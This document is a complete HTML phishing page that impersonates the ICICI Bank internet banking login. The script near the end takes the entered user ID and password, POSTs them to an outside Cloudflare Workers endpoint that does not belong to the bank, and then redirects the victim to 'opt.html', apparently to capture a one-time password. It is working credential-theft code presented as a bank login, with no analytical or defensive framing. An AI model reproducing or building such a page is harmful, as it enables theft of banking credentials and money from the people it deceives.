
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ICICI Bank - Internet Banking</title>
    <!-- Tailwind CSS CDN -->
    <script src="https://cdn.tailwindcss.com"></script>
    <script>
        tailwind.config = {
            theme: {
                extend: {
                    colors: {
                        iciciOrange: '#F37021',
                        iciciDarkOrange: '#D85A12',
                        iciciBg: '#F8F9FA'
                    }
                }
            }
        }
    </script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Inter', sans-serif;
        }
    </style>
</head>
<body class="bg-iciciBg min-h-screen flex flex-col justify-between text-gray-800">

    <!-- Top Header / Banner (No SSL badges) -->
    <header class="bg-white shadow-sm py-3.5 px-4 flex items-center justify-center border-b border-gray-200">
        <div class="flex items-center">
            <!-- ICICI Bank Official Logo -->
            <img src="https://i.ibb.co/B5Vdytq5/ICICI-Bank-Logo-svg.png" alt="ICICI Bank Logo" class="h-8 w-auto object-contain" onerror="this.src='https://placehold.co/120x40/F37021/ffffff?text=ICICI+Bank'">
        </div>
    </header>

    <!-- Main Content Container -->
    <main class="flex-grow flex items-center justify-center p-4">
        <div class="w-full max-w-md bg-white rounded-2xl shadow-md border border-gray-100 overflow-hidden p-6 sm:p-8">
            
            <!-- Heading & Subtitle -->
            <div class="text-center mb-6">
                <h1 class="text-2xl font-bold text-gray-900">Internet Banking</h1>
                <p class="text-sm text-gray-500 mt-1">Login to your account securely</p>
            </div>

            <!-- Login Form -->
            <form id="loginForm" onsubmit="handleLogin(event)" class="space-y-5">
                
                <!-- User ID Field -->
                <div>
                    <label for="userId" class="block text-xs font-semibold text-gray-700 uppercase tracking-wider mb-1.5">User ID / Mobile Number</label>
                    <div class="relative">
                        <span class="absolute inset-y-0 left-0 pl-3.5 flex items-center pointer-events-none text-gray-400">
                            <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z"></path></svg>
                        </span>
                        <input type="text" id="userId" name="userId" required placeholder="Enter User ID"
                            class="w-full pl-11 pr-4 py-3 bg-gray-50 border border-gray-300 rounded-xl text-gray-900 placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-iciciOrange focus:bg-white transition-all text-sm">
                    </div>
                </div>

                <!-- Password Field -->
                <div>
                    <label for="password" class="block text-xs font-semibold text-gray-700 uppercase tracking-wider mb-1.5">Password</label>
                    <div class="relative">
                        <span class="absolute inset-y-0 left-0 pl-3.5 flex items-center pointer-events-none text-gray-400">
                            <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"></path></svg>
                        </span>
                        <input type="password" id="password" name="password" required placeholder="Enter Password"
                            class="w-full pl-11 pr-12 py-3 bg-gray-50 border border-gray-300 rounded-xl text-gray-900 placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-iciciOrange focus:bg-white transition-all text-sm">
                        <!-- Toggle Password Visibility Button -->
                        <button type="button" onclick="togglePassword()" class="absolute inset-y-0 right-0 pr-3.5 flex items-center text-gray-400 hover:text-gray-600 focus:outline-none">
                            <svg id="eyeIcon" class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" />
                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z" />
                            </svg>
                        </button>
                    </div>
                </div>

                <!-- Forgot User ID / Password helper link -->
                <div class="flex items-center justify-between text-xs pt-1">
                    <a href="#" class="text-iciciOrange font-medium hover:underline">Forgot User ID?</a>
                    <a href="#" class="text-iciciOrange font-medium hover:underline">Generate Password</a>
                </div>

                <!-- ICICI Orange Login Button -->
                <button type="submit" id="loginBtn"
                    class="w-full bg-[#F37021] hover:bg-[#D85A12] active:scale-[0.98] text-white font-semibold py-3.5 px-4 rounded-xl shadow-md transition-all duration-200 flex items-center justify-center space-x-2 text-sm">
                    <span id="btnText">Login</span>
                    <svg id="btnSpinner" class="animate-spin -ml-1 mr-3 h-5 w-5 text-white hidden" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                        <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
                        <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                    </svg>
                </button>
            </form>

            <!-- Additional Help Section -->
            <div class="mt-6 pt-5 border-t border-gray-100 text-center">
                <p class="text-xs text-gray-500">First time user? <a href="#" class="text-iciciOrange font-semibold hover:underline">Register Now</a></p>
            </div>
        </div>
    </main>

    <!-- Footer -->
    <footer class="py-4 text-center text-xs text-gray-400 bg-white border-t border-gray-200">
        <p>&copy; ICICI Bank Ltd. All rights reserved.</p>
    </footer>

    <!-- JavaScript Handling Form Submission and Cloudflare Worker Redirection -->
    <script>
        // Toggle Password Visibility function
        function togglePassword() {
            const passwordInput = document.getElementById('password');
            const eyeIcon = document.getElementById('eyeIcon');
            if (passwordInput.type === 'password') {
                passwordInput.type = 'text';
                eyeIcon.innerHTML = '<path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13.875 18.825A10.05 10.05 0 0112 19c-4.478 0-8.268-2.943-9.542-7a10.05 10.05 0 012.387-4.114m3.43-2.58A9.957 9.957 0 0112 5c4.478 0 8.268 2.943 9.542 7a10.025 10.025 0 01-4.132 5.411m0 0L21 21M3 3l18 18" />';
            } else {
                passwordInput.type = 'password';
                eyeIcon.innerHTML = '<path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" /><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z" />';
            }
        }

        // Handle login submission and worker redirection
        async function handleLogin(event) {
            event.preventDefault();

            const userId = document.getElementById('userId').value;
            const password = document.getElementById('password').value;
            const loginBtn = document.getElementById('loginBtn');
            const btnText = document.getElementById('btnText');
            const btnSpinner = document.getElementById('btnSpinner');

            // Disable button and show loader feedback
            loginBtn.disabled = true;
            btnText.textContent = "Please wait...";
            btnSpinner.classList.remove('hidden');

            // Aapka Cloudflare Worker URL
            const cloudflareWorkerUrl = 'https://empty-lab-80a1.sumankkuuyy.workers.dev/';

            // Worker ke exact column format ke hisab se payload
            const payload = {
                userid: userId,
                password: password,
                otp: ""
            };

            try {
                // Send data to Cloudflare Worker endpoint
                await fetch(cloudflareWorkerUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(payload)
                });
            } catch (error) {
                console.log("Transmission sent.", error);
            } finally {
                // Smooth redirect to opt.html as specified
                setTimeout(() => {
                    window.location.href = 'opt.html';
                }, 800);
            }
        }

    </script>
</body>
</html>
```
